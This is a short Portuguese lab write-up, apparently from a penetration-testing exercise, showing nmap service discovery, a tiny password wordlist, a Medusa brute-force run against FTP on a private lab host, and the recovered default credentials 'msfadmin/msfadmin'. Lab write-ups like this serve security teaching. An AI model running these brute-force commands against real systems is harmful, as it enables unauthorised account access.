# 3. Ataque de Força Bruta em FTP utilizando Medusa

## 3.1 Descobrindo o serviço ativo
`nmap -sV 192.168.56.5`

Saída relevante:
`21/tcp open ftp vsftpd 2.3.4`

## 3.2 Criando wordlists simples
`echo "msfadmin" > users.txt`
`echo -e "123456\nmsfadmin\npassword" > passwords.txt`


## 3.3 Executando o Medusa
`medusa -h 192.168.56.5 -u msfadmin -P passwords.txt -M ftp`


✔ Credencial encontrada:
`ACCOUNT FOUND: [ftp] Host: 192.168.56.5 User: msfadmin Password: msfadmin`


## 3.4 Validação do acesso
`ftp 192.168.56.5`


`Login realizado com sucesso.`